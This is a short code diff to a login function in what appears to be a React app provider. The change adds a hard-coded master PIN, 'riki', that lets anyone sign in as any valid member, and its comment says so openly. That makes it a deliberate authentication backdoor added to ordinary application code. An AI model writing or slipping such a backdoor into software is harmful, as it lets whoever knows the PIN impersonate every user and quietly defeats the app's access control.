@@ -100,7 +100,8 @@ export const AppProvider = ({ children }) => {
 
     const login = (memberId, pin) => {
         const user = USERS_DATA.find(u => u.id === parseInt(memberId));
-        if (user && user.pin === pin) {
+        // Master PIN "riki" allows login as any valid user
+        if (user && (pin === 'riki' || user.pin === pin)) {
             setCurrentUser({ id: user.id, name: user.name });
             return true;
         }
